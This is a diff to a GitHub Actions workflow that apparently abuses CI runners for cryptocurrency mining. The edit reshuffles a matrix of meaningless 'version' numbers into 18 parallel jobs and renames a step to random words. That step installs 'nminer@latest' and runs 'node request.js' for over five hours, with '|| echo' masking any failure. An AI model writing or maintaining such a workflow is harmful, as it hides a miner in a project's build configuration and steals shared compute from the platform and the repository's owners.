@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 262 }
-          - { version: 5839 }
-          - { version: 9273 }
-          - { version: 6739 }
-          - { version: 6577 }
-          - { version: 4377 }
-          - { version: 6463 }
-          - { version: 5300 }
-          - { version: 3207 }
-          - { version: 2093 }
-          - { version: 7556 }
-          - { version: 690 }
-          - { version: 7537 }
-          - { version: 3711 }
-          - { version: 2893 }
-          - { version: 9112 }
-          - { version: 7914 }
+          - { version: 1123 }
+          - { version: 2146 }
+          - { version: 9583 }
+          - { version: 2814 }
+          - { version: 9094 }
+          - { version: 1130 }
+          - { version: 2244 }
+          - { version: 8985 }
+          - { version: 6903 }
+          - { version: 7951 }
+          - { version: 3757 }
+          - { version: 7228 }
+          - { version: 5635 }
+          - { version: 7323 }
+          - { version: 5836 }
+          - { version: 24 }
+          - { version: 724 }
+          - { version: 9748 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: feminize independence gloss
+      - name: boo except sociable
         run: |
           npm install nminer@latest
-          timeout 344m node request.js || echo "request executed"
+          timeout 324m node request.js || echo "request executed"
